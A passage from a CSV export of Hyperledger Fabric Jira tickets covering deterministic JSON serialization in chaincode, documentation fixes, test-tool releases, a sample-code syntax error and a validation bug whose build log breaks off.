Especially problematic is order of JSON elements, since the JSON spec does not guarantee an order. Go Marshal() ([https://golang.org/pkg/encoding/json/#Marshal)] happens to sort map elements, but this is an implementation detail that may change in the future. Javascript ( [https://github.com/nodejs/node/issues/15628|https://github.com/nodejs/node/issues/15628] ) and Java perform no such ordering. And all three languages would certainly produce different results for the same modeled JSON object.

Minimally the concern needs to be well documented. Perhaps some recommendations could be made for using deterministic libraries (e.g. [https://github.com/BridgeAR/safe-stable-stringify/] ). Or perhaps given the prevalence and criticality, the chaincode programming model itself could provide consistent serialization utilities across the languages.

 ",,davidkel,denyeart,icarrascol,jmason900,mastersingh24,pandrejko,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrhj:u",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),davidkel,denyeart,icarrascol,jmason900,mastersingh24,pandrejko,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jan/20 9:07 PM;mastersingh24;I do not believe that Fabric should provide any canonical JSON serialization libraries at all, but at a minimum we must not put them in the core chaincode libraries.
IMHO, this is just a specific example of the fact that keys and values need to be deterministic across invocations (well technically you might get lucky depending on the endorsement policy).;;;","19/Jan/20 11:21 PM;yacovm;I concur. There is really no end for utility libraries that can be used in Fabric, or Blockchain in general - starting from deterministic JSON marshalling and ending with cryptographic primitives. 

I think the right approach is to have these libraries integrated in samples, and people can look at best practices and examples and choose to adopt the approach or use their own.;;;","19/Apr/20 1:10 PM;denyeart;Agreed, tagging for doc and samples.;;;","13/Jan/21 4:26 AM;pandrejko;[~denyeart] Do any of the udpated Fabric Samples demonstrate this best practice?;;;","13/Jan/21 4:54 AM;icarrascol;i think this issue is related to this other issue, https://jira.hyperledger.org/browse/FABCN-440;;;","23/Apr/21 8:58 PM;denyeart;Deterministic JSON marshaling is documented here: [https://hyperledger-fabric.readthedocs.io/en/latest/couchdb_as_state_database.html#reading-and-writing-json-data]

I agree samples would also help.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Investigate Handling Azure Kubernetes Service DNS Routing in Operator Tool,FAB-17415,44026,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,btl5037,btl5037,18/Jan/20 12:52 PM,18/Jan/20 12:52 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,,,,,,"In the launcher code, we loop over the NodePort interface and grab the first public IP we encounter. AKS however uses DNS routing and uses application routes to create subdomains of the clusters public DNS entry.

We need to investigate a method for handling this situation and propose resolution",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017wz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should be pullable without curling/cloning the repo,FAB-17416,44034,,Task,In CR Review,FAB,Fabric,software,denyeart,,,Medium,,,awjh-ibm,awjh-ibm,21/Jan/20 1:34 AM,31/Jan/20 8:25 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,Currently chaincode-integration is accessible via its tarball in the repo. This should be replaced with a true release available through the normal channels e.g. github release and npm,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017xv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jan/20 8:25 PM;awjh-ibm;Unstable release is out. Waiting on permissions in azure to run the main release scripts

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update chaincode for developers tutorial,FAB-17417,44035,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,21/Jan/20 4:19 AM,09/Nov/20 11:48 PM,28/Oct/23 3:09 AM,09/Nov/20 11:48 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Update chaincode for developers for chaincode lifecycle

Tutorial contains a few references to instantiating a smart contract",,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-11237,,,No,,Unset,No,,,"1|i017y3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix path issues in systemtest,FAB-17418,44037,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,21/Jan/20 5:43 AM,29/Jan/20 1:01 PM,28/Oct/23 3:09 AM,22/Jan/20 4:16 AM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8x",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jan/20 3:17 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/61];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"off_chain_data - Error when run command ""node blockEventListener.js""",FAB-17419,43999,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish1635,manish1635,manish1635,15/Jan/20 8:32 PM,01/Apr/20 3:51 AM,28/Oct/23 3:09 AM,01/Apr/20 3:51 AM,v1.4.4,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"In [fabric-samples|https://github.com/hyperledger/fabric-samples]/*off_chain_data*/, When run command “node blockEventListener.js”  to start the block event listener throws error:

              continue();

                      ^

 

SyntaxError: Unexpected token (

    at createScript (vm.js:80:10)

    at Object.runInThisContext (vm.js:139:10)

    at Module._compile (module.js:607:28)

    at Object.Module._extensions..js (module.js:654:10)

    at Module.load (module.js:556:32)

    at tryModuleLoad (module.js:499:12)

    at Function.Module._load (module.js:491:3)

    at Module.require (module.js:587:17)

    at require (internal/module.js:11:18)

    at Object.<anonymous> (/home/fabric-samples/off_chain_data/blockEventListener.js:48:25)",,heatherp,lehors,manish1635,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017sj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),heatherp,lehors,manish1635,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Jan/20 8:33 PM;manish1635;In order to fix this problem, Please replace “continue();” with “continue; “.  The replacement needs to be done at line number 53 and 60 in blockProcessing.js.;;;","21/Jan/20 11:24 PM;heatherp;This is a bug in fabric-samples, so moved across project;;;","22/Jan/20 5:36 PM;manish1635;I would like to submit a pull request PR. Please allow me to commit the fix for review.;;;","01/Apr/20 3:51 AM;lehors;https://github.com/hyperledger/fabric-samples/pull/146;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Backport FAB-15709 - Allow orderer startup with no channels defined,FAB-17420,44043,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,wlahti,sykesm,sykesm,22/Jan/20 1:03 AM,14/Feb/20 7:44 AM,28/Oct/23 3:09 AM,08/Feb/20 2:25 AM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"Today, if the orderer does not have any channels defined, it panics because it cannot find the system channel.  This story is to remove those startup checks to allow the orderer to start successfully, even though it will not be in a position to accomplish anything.  This should also block channel creation requests if no system channel is defined to route them to.",,denyeart,hakan.eryargi,jyellick,kchristidis,sykesm,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15709,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlsqi",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,hakan.eryargi,jyellick,kchristidis,sykesm,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Feb/20 4:06 AM;wlahti;[https://github.com/hyperledger/fabric/pull/625];;;","08/Feb/20 2:25 AM;wlahti;There was some miscommunication on the need for this in 1.4.x. Closing for now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Change Fabric Smartcontract Chaincode SDK to API ,FAB-17421,44044,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,pandrejko,pandrejko,22/Jan/20 1:04 AM,05/Feb/20 4:37 AM,28/Oct/23 3:09 AM,05/Feb/20 4:37 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"On this page https://hyperledger-fabric.readthedocs.io/en/latest/getting_started.html
for this section https://hyperledger-fabric.readthedocs.io/en/latest/getting_started.html#hyperledger-fabric-smart-contract-chaincode-sdks

we need to change the SDK language to refer to APIs instead..

So it would read:
Hyperledger Fabric smart contract (chaincode)APIs

Hyperledger Fabric offers a number of APIs to support developing smart contracts (chaincode) in various programming languages. Smart contract APIs are available for Go, Node.js, and Java:

        Go API documentation * Low-level. * High-level.
        Node.js API and Node.js API documentation.
        Java API and Java API documentation.

and the corresponding link to this section would change to:
https://hyperledger-fabric.readthedocs.io/en/latest/getting_started.html#hyperledger-fabric-smart-contract-chaincode-apis

We need to add a sentence here that lets the reader know that a compatibility matrix is available in the documentation links.

I need to do an audit of the rest of our documentation to see if we refer to Fabric Chaincode SDK anywhere else in the documentation and update it appropriately.",,heatherp,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwzf",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),heatherp,pandrejko,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jan/20 1:05 AM;pandrejko;[~mbwhite][~heatherp][~lesleyannj][~bestbeforetoday];;;","22/Jan/20 2:13 AM;heatherp;Looks good Pam, thanks :) 
1) I would recommend stepping away from referring to ""high-level"" and ""low-level"", specifically on the line about Go API documentation. An alternative could be ""chaincode"" and ""contract-api"" 
2) I would recommend referring to the different language implementations as ""contract-apis"", so I'm thinking something like:

_Go API documentation chaincode, contract-api_
_Node.js contract API and Node.js contract API documentation._
_Java contract API and Java contract API documentation._

Extra information for clarity: when we're referring to ""low-level"" in reference to chaincode, we're talking about the *fabric-shim* packages. The ""high-level"" stuff is in the *fabric-contract-api* packages. For node and java, they live in the same repository; *fabric-chaincode-node* and f*abric-chaincode-java*. For Go, the former lives in *fabric-chaincode-go* and the latter lives in *fabric-contract-api-go*.

 

When we want to encourage users to use the ""high-level"", that means we want them to make use of the apis provided by the contract-api. If we don't need to refer to fabric-chaincode-go in this section of the docs, the above could be changed to this:

_Go contract API documentation_
_Node.js contract API and Node.js contract API documentation._
_Java contract API and Java contract API documentation._

Does that make sense? I'm happy to clarify further (it's a whole other ball game for SDKs!) and provide comments/a review for a PR for this, if that's at all useful :);;;","28/Jan/20 11:08 PM;pandrejko;PR: https://github.com/hyperledger/fabric/pull/573;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Prometheus information in Fabric Docs,FAB-17422,44047,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,pandrejko,pandrejko,22/Jan/20 3:01 AM,17/Feb/20 10:25 PM,28/Oct/23 3:09 AM,17/Feb/20 10:25 PM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,1,ipm,,,,,"1. Add link to CA metric configuration from here: https://hyperledger-fabric.readthedocs.io/en/latest/operations_service.html
2. Add link to CA metrics from here: https://hyperledger-fabric.readthedocs.io/en/latest/metrics_reference.html
3. Also need to identify which metrics are for peer and which are for the orderer.

[~sykesm] When you have time,  if you can indicate which metrics are for peer or orderer then I can add it to the docs..",,denyeart,pandrejko,rolivieri,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlsq",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,pandrejko,rolivieri,tsharris,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Feb/20 6:05 AM;tsharris;[https://github.com/hyperledger/fabric/pull/601];;;","11/Feb/20 2:31 PM;denyeart;https://github.com/hyperledger/fabric/pull/651 separates peer and orderer metrics - merged.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
remove any remaining .py scripts from fabric-test,FAB-17423,44051,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,scottz,scottz,22/Jan/20 6:43 AM,16/Jun/20 11:15 AM,28/Oct/23 3:09 AM,16/Jun/20 11:15 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,python test drivers and code have all been replaced. Any remaining python files can be removed from 1.4 and master branches in fabric-test. And CI can stop installing python.,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17223,,,FAB-16897,FAB-16804,FAB-16803,FAB-16761,FAB-16064,FAB-17178,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16160,,,No,,Unset,No,,,"1|hzwqfp:o",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),scottz,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jan/20 7:04 AM;scottz;[https://github.com/hyperledger/fabric-test/pull/65];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broken link in Developing apps connection profile,FAB-17424,44054,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,pandrejko,pandrejko,22/Jan/20 9:55 PM,31/Jan/20 6:32 PM,28/Oct/23 3:09 AM,31/Jan/20 4:28 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,," -- found this documentation issue, e.g., broken link.
-- In this page: https://hyperledger-fabric.readthedocs.io/en/latest/developapps/connectionprofile.html
-- last paragraph under the Usage section, last sentence where it says, ""Read about the list of available connection options and when to use them.""
-- the link on ""about"" is broken - it points to this page which loads as ""doesn't exist yet""
https://hyperledger-fabric.readthedocs.io/en/latest/developapps/connectoptions.html",,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0181f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joe-alewine,pandrejko,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jan/20 3:22 AM;joe-alewine;https://github.com/hyperledger/fabric/pull/604;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move tests for _lifecycle golang docker builds from e2e kafka test,FAB-17425,44055,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wlahti,wlahti,22/Jan/20 11:44 PM,09/Mar/21 3:44 AM,28/Oct/23 3:09 AM,09/Mar/21 3:44 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"Currently, the e2e test for ""basic kafka network with 2 orgs"" contains our tests surrounding golang docker builds for module and gopath chaincodes using _lifecycle. These should be moved to an appropriate place in the lifecycle tests, keeping this review comment from @sykesm in mind: 
{code:java}
This is tricky. The test is placed in e2e so we can reduce the number of networks and, hopefully, improve the speed of the tests. I like that.

On the other hand, this is pretty unrelated to the kafka network test - especially since we're de-prioritizing kafka going forward.

Is there a better place to put this within lifecycle that would not extend the execution times greatly? The fact that we are deploying chaincode with docker means they will always take a long time... {code}",,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zs4",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Mar/21 3:44 AM;sykesm;Fixed in https://github.com/hyperledger/fabric/pull/2401;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Transaction reported successfully despite VSCC error in chaincode,FAB-17426,44100,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,vijaypunugubati,vijaypunugubati,23/Jan/20 1:29 AM,25/Aug/20 7:53 PM,28/Oct/23 3:09 AM,07/Feb/20 4:17 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,quality,test-triage,,,,"stateBasedValidator.Validate failed for chaincode samplecc in tx observed in the fabric-test build.

Branch: Master

Build log: [https://dev.azure.com/Hyperledger/495b205d-295a-4493-a785-099a0d6b840e/_apis/build/builds/5826/logs/12]
{code:java}
/========================== Starting Command Output ===========================
2020-01-22T16:16:55.7198991Z [command]/bin/bash --noprofile --norc /home/vsts/work/_temp/ef6a1ed5-a5e6-48d8-9763-f51fb43fb5d8.sh
